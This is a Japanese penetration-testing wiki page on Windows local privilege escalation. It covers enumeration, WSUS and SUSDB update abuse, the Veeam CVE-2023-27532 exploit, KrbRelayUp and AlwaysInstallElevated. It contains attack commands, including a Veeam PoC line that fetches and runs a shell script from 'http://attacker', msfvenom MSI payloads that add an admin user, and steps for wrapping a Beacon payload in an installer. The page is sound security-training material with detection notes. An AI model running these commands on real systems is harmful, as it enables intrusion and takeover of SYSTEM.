# Windowsローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windowsのローカル権限昇格ベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、基礎的な複数のガイドに基づき、Windowsの権限昇格に関する一般的な手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れには、コミュニティのワークショップやチェックリストも取り入れています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windowsの権限昇格を扱ったDerbyConのプレゼンテーションが含まれています。<sup>[[5]](#references)</sup>

要点を簡潔に確認するには、[ローカル権限昇格チェックリスト](../checklist-windows-privilege-escalation.md)を参照してください。

## Windowsの基礎理論

### アクセストークン

**Windowsのアクセストークンについて知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**ACL - DACL/SACL/ACEの詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 整合性レベル

**Windowsの整合性レベルについて知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windowsのセキュリティ制御

Windowsには、**システムの列挙や実行ファイルの実行を妨げたり、さらには操作を検知したりする**要素があります。権限昇格の列挙を始める前に、以下の**ページを読み**、これらの**防御機構**をすべて**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでのUEFI NVRAM編集を、起動前DMAとWindowsの`SYSTEM`メモリパッチ適用につなげることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccessによるサイレント昇格

`RAiLaunchAdminProcess`経由で起動したUIAccessプロセスは、AppInfoのセキュアパスチェックを回避すると、プロンプトなしでHigh ILに到達するために悪用される可能性があります。専用のUIAccess/Admin Protectionバイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktopのアクセシビリティレジストリ伝播は、任意のSYSTEMレジストリ書き込み（RegPwn）に悪用される可能性があります:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近のWindowsビルドでは、特権を持つローカルNTLM認証を再利用されたSMB TCP接続上でリフレクトする、**SMB任意ポート**経由のLPE手法も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

既存のPowerShellセッションからローカルのインベントリを取得する方法については、[.NETを使ったWindows列挙](../basic-powershell-for-pentesters/dotnet-enumeration.md)を参照してください。以下の例は、別の列挙用実行ファイルを起動せずに、下記の確認項目を補完します。

### バージョン情報の列挙

Windowsのバージョンに既知の脆弱性がないか確認します（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン Exploits

Microsoft のセキュリティ脆弱性に関する詳細情報を検索するには、この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)が便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が持つ**巨大な攻撃対象領域**を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSビルド、インストール済み更新プログラム、該当する可能性のあるアドバイザリ候補を列挙します。結果が該当すると判断する前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカル exploit を使う場合は、OSのアーキテクチャだけでなく、**実行中プロセスのアーキテクチャ**も確認してください。64-bit Windowsでは、32-bitプロセスに[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)が適用されます。通常、`%windir%\System32` は32-bitシステムディレクトリに解決されますが、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64-bitプロセスでは使用できません。OSビルドや未適用KBの候補があるだけでは、exploit可能だとは証明できません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、exploitの前提条件を、該当する問題の[Microsoftセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照らし合わせてください。

サービスのメモリ破損の例については、[クライアントが制御するMIDI共有メモリリングのオフセット](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions)を参照してください。公開されているスタックオフセットはテスト済みのビルドにのみ適用されます。`LOCAL SERVICE`への昇格と、その後の`SYSTEM`への[SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)のステップは別のものです。<sup>[[44]](#references)</sup>

**システム情報を使ったローカルでの確認**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploitのGithubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に資格情報や有用な情報が保存されていますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

書き込み可能な [PowerShell profile](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) は、別のスタートアップ実行の手がかりです。権限の高いユーザーが実際にその profile を読み込むか確認してから、権限昇格につながると判断してください。

### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で有効化する方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで一例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルをリダイレクトできます。transcript を確認する前に、実際の出力先とファイルの ACL を確認してください。コマンド引数や出力が記録されており、認証情報が含まれている可能性があります。読み取り可能な transcript は、内容から使用可能な高権限の ID が判明し、その ID で該当するコンテキストにログオンできる場合にのみ、手掛かりとなります。

### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録されます。これには実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShellログから直近15件のイベントを表示するには、次を実行します：

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行アクティビティ全体と完全な内容が記録され、コードの各ブロックが実行時にすべて記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意ある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のイベントログは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近の20件のイベントを表示するには、次を使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

先ほどのガイダンスでは、リスクを次のようにまとめていました。

更新プログラムが http**S** ではなく http を使って要求されている場合、システムを侵害できる可能性があります。

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手がかりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、さらにクライアントの更新プログラムに対する信頼設定とインストールポリシーにも左右されます。URL だけでは、コード実行が可能だとは判断できません。[Microsoft は WSUS メタデータに TLS を使用することを推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、cmd で次のコマンドを実行し、ネットワークで非 SSL の WSUS 更新が使用されているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShellで以下を実行します:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信を受け取った場合：

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

元の適用可能性に関する記述は次のとおりです。

その場合、**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

`UseWUServer` が `1` の場合、Windows Update は設定済みのイントラネットサービスを使用します。これはHTTP interceptionの経路に必要な前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定されたWSUSエンドポイントは選択されません。

この脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus)などのツールを使用できます。これらは、SSLを使用しないWSUSトラフィックに「偽の」更新プログラムを注入するためのMiTM weaponized exploitスクリプトです。

調査内容はこちらです。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このbugがexploitするのは次の欠陥です。

> ローカルユーザーのプロキシ設定を変更でき、Windows UpdateがInternet Explorerの設定で構成されたプロキシを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自分自身のトラフィックをinterceptし、対象マシン上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUSホスト名用の自己署名証明書を生成し、その証明書を現在のユーザーの証明書ストアに追加すれば、HTTPとHTTPSの両方のWSUSトラフィックをinterceptできます。WSUSには、証明書のtrust-on-first-use型検証を実装するHSTSのような仕組みはありません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスに受け入れられます。

この脆弱性は、ツール[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)を使用してexploitできます（公開後）。

### WSUS管理者が制御する更新プログラム

現在のIDでWSUSサーバー上の更新プログラムを**公開および承認**できる場合は、別の経路が存在します。サーバーの`WSUS Administrators`グループへの実効的な所属と、委任されたWSUS権限を確認したうえで、承認済み更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoftは更新プログラムの承認にWSUS Administrator権限が必要であるとしています](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)。また、[公開における信頼関係について説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使われた証明書を信頼する必要があります。この経路を権限昇格とみなす前に、対象の更新プログラムが署名され受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTPの`WUServer`値やグループ名だけでは、これらの条件が満たされているとは言えません。

### SUSDBのカスタム更新プログラムの悪用：`.txt`/`.esd`経由の未署名ペイロード

これはHTTP WSUS接続のinterceptionとは異なる信頼境界の問題です。前提となるのは、カスタム更新プログラムを公開および承認するために、**WSUSデータベース（`SUSDB`）のストアドプロシージャ**を実行できるだけのアクセス権です。実用的な侵入経路の一つとして、上流WSUSコンピューターアカウントを、中継先の別の`SUSDB`ホストMSSQLサーバーにリレーする方法があります。具体的な前提条件は環境によって異なるため、SQL管理者権限があると決めつけず、まず`EXECUTE`権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUSクライアント認証をHTTP/8530からLDAP、SMB、またはAD CSへリレーする別の攻撃経路については、[NTLM relayのためのWSUS HTTPの悪用](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 外部データベースへのリレーとプロシージャ権限の確認

WSUSが外部SQL Serverを使用する環境では、まずWSUSサーバーアカウントがデータベースに認証できるか、またNTLM relayがそのリスナーに到達するかを確認してください。サーバーのSQLロールによっては、テーブルへの直接書き込みが拒否されていても、更新プログラム公開用のプロシージャを実行できる場合があります。`SUSDB`への`UPDATE`が失敗しても、公開が阻止されているとは限りません。カスタム更新プログラムを試す前に、認可されたSQLセッションで実効ID、ロールメンバーシップ、プロシージャ権限を確認してください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブの手順定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構築する際に役立ちます。バンドルの親とペイロードの子には、それぞれ `UpdateIdentity`（フラグメントタイプ `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しで返されるローカルリビジョン ID を取得し、バンドルの関連付け、ダイジェスト、サイズ、コンテンツ URL、リビジョンに一貫性を保たせてください。これは状態を持つ公開ワークフローであるため、ストアドプロシージャの呼び出しが1回成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新をビルドし、対象を指定して承認する

カスタム更新ワークフローでは、正規の WSUS 手順を制限付きの公開 API として使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新メタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ済み、および拡張 XML フラグメントを保存 | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付け | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加 | `spGetAllTargetGroups`、`spCreateTargetGroup`、`spGetComputerTargetByName`、`spAddComputerToTargetGroup` |
| そのグループに対するインストールを承認 | `@actionID = 0` および `@isAssigned = 1` を指定して `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、および `CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント全体で一致している必要があります。コンテンツ URL と対象グループを割り当てた後の最終承認は、次のようになります。例の GUID を再利用せず、新しい更新、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUS は通常、署名のない任意の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` では、.NET の `VerifyFile` パスが、渡されたファイル名が `.txt` または `.esd` で終わる場合に証明書チェックのフラグを false に設定します。そのため、バイト列がテキストまたは正規の ESD イメージであることを事前に確認せずに、`CheckCertificateSignature` がスキップされます。したがって、変更されていない PE でも、たとえば `payload.exe.txt` という名前にすればコンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate` を呼び出すと、WSUSが登録済みのコンテンツを取得します。オリジンはBITSのHTTP要件を満たす必要があります。URLにアクセスできるだけでは不十分で、転送では最初に`HEAD`/`GET`を行い、その後バイト範囲リクエストを使用します。Rangeに対応していないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、インポート／フラグメント／URL／グループ／デプロイの一連の処理に必要なSQLを生成し、その実行用に改変したMSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`を同梱しています。認可されたラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による persistence

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。テストでは、更新が失敗または未完了のままの payload は、callback プロセスが終了するとすぐに再度提示されました。そのため、再試行の動作が繰り返し実行される persistence につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知と hardening の手がかり

このチェーンで役立つサーバー側およびクライアント側の手がかりは次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査します。新しいターゲティンググループ、外部のコンテンツ配信元、`.txt`/`.esd` の更新 payload、想定外の principal（特にコンピューターアカウント以外）によるデプロイを調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認します。拡張子を信用せず、検証記録を payload の拡張子やコンテンツのマジックナンバーと照合します。
- Windows Update のインストールが繰り返し失敗・再試行されるケース、および `.txt` や `.esd` という名前のコンテンツから実行される PE や、想定外の子プロセス・ネットワークアクティビティを探します。
- 対応している場合は、データベースサービスで Authentication の Extended Protection を必須にし、データベースへのネットワークアクセスを WSUS サーバーと許可された管理システムに限定します。カスタム更新手順の `EXECUTE` 権限は最小限にし、監査します。

## サードパーティ製自動更新プログラムと Agent IPC（local privesc）

多くのエンタープライズエージェントは、localhost の IPC インターフェイスと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、更新プログラムが不正な root CA や不十分な署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を送り込み、SYSTEM サービスにインストールさせることができます。Netskope stAgentSvc のチェーン（CVE-2025-0309）に基づく一般化された手法については、こちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401 経由の SYSTEM）

当初のバージョン固有の説明と偵察メモは次のとおりです。

Veeam B&R < `11.0.1.1261` は、**TCP/9401** で localhost のサービスを公開しており、攻撃者が制御するメッセージを処理するため、任意のコマンドを **NT AUTHORITY\SYSTEM** として実行できます。<sup>[[12]](#references)</sup>

- **Recon**: リスナーとバージョンを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424)には、バックアップネットワークの境界内で暗号化された構成データベースの認証情報が認証なしで漏えいする問題が記載されています。また、別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が実証されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドする可能性があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 が `Veeam.Backup.Service.exe` に属することを確認し、インストール済み製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手がかりであり、完全なパッチ確認にはなりません。
- **修正済みの最低バージョン**: Veeam によると、最初の修正済みリリースは **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** です。それ以前のリリースは影響を受けます。4つの要素からなるファイルバージョンだけでは、同じビルド番号の未パッチ版と後続パッチ版を区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC と必要な Veeam DLL を同じディレクトリに配置し、ローカルソケット経由で SYSTEM payload を実行します。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

このサービスはコマンドを SYSTEM として実行します。

引用された PoC は、追加の前提条件が満たされている場合にコマンドを SYSTEM として実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。

## KrbRelayUp

元のデフォルト環境に関する説明は次のとおりです。

特定の条件下で、Windows の**ドメイン**環境に**ローカル権限昇格**の脆弱性が存在します。条件には、**LDAP 署名が強制されていない**環境、ユーザーが**リソースベースの制約付き委任（RBCD）**を設定できる自己権限を持っていること、そしてユーザーがドメイン内にコンピューターを作成できることが含まれます。これらの**要件**は**デフォルト設定**で満たされることに注意してください。

ローカル Kerberos リレーは、適切な COM サーバーが認証を行い、リレーされたプリンシパルが対象オブジェクトに対する権限を持つ場合、低権限のログオンから特権ディレクトリ書き込みへ到達できます。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink`（シャドウ認証情報）の LDAP 書き込みの両方が扱われています。KrbRelayUp は、これらの経路の一部を自動化します。RBCD のチェーンには、該当する委任と対象オブジェクトへの権限が必要です。一方、シャドウ認証情報のチェーンには、キー認証情報を書き込む権限と、証明書認証の経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで成立するものではありません。

実際の DC の [LDAP 署名](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing)と [LDAPS チャネルバインディング](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)のポリシー、リレーされる ID のオブジェクト ACL、選択した COM クラスの認証レベルと偽装レベルを確認してください。呼び出し元のログオンの種類と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使ったログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果が変わることがあります。ポリシーが緩い、または ACL が一致する場合は、確認候補として扱ってください。受動的な列挙によって、COM コアーション、リレー認証、ディレクトリ書き込みを引き起こしてはなりません。マシンアカウントのシャドウ認証情報からマシンチケットを取得できる場合がありますが、そのアカウントが必要なディレクトリレプリケーション権限を持つ場合に限り、別途 DCSync 経路へ進めます。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)で**exploit を**確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリキーが**有効**（値が**0x1**）になっている**場合**、どの権限レベルのユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Meterpreter session があれば、モジュール **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使うと、権限昇格用の Windows MSI バイナリを現在のディレクトリに作成できます。このスクリプトは、ユーザーまたはグループの追加を促すプリコンパイル済み MSI インストーラーを書き出します（そのため、GIU へのアクセスが必要です）。

```
Write-UserAddMSI
```

作成したバイナリを実行するだけで、privilege escalationできます。

### MSI Wrapper

このツールを使ってMSI wrapperを作成する方法は、こちらのチュートリアルを読んでください。**command lines**を**実行**するだけでよい場合は、「**.bat**」ファイルをラップできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成

- Cobalt StrikeまたはMetasploitで、新しい**Windows EXE TCP payload**を生成し、`C:\privesc\beacon.exe`に保存します。
- **Visual Studio**を開き、**Create a new project**を選択して、検索ボックスに「installer」と入力します。**Setup Wizard**プロジェクトを選択し、**Next**をクリックします。
- プロジェクト名（例：**AlwaysPrivesc**）を入力し、場所に**`C:\privesc`**を指定します。**place solution and project in the same directory**を選択し、**Create**をクリックします。
- ステップ3/4（含めるファイルの選択）に進むまで**Next**をクリックします。**Add**をクリックし、先ほど生成したBeacon payloadを選択します。その後、**Finish**をクリックします。
- **Solution Explorer**で**AlwaysPrivesc**プロジェクトを選択し、**Properties**で**TargetPlatform**を**x86**から**x64**に変更します。
  - **Author**や**Manufacturer**など、インストールしたアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックして、**View > Custom Actions**を選択します。
- **Install**を右クリックし、**Add Custom Action**を選択します。
- **Application Folder**をダブルクリックし、**beacon.exe**ファイルを選択して**OK**をクリックします。これにより、インストーラーの実行と同時にBeacon payloadが実行されます。
- **Custom Action Properties**で、**Run64Bit**を**True**に変更します。
- 最後に、**ビルドします**。
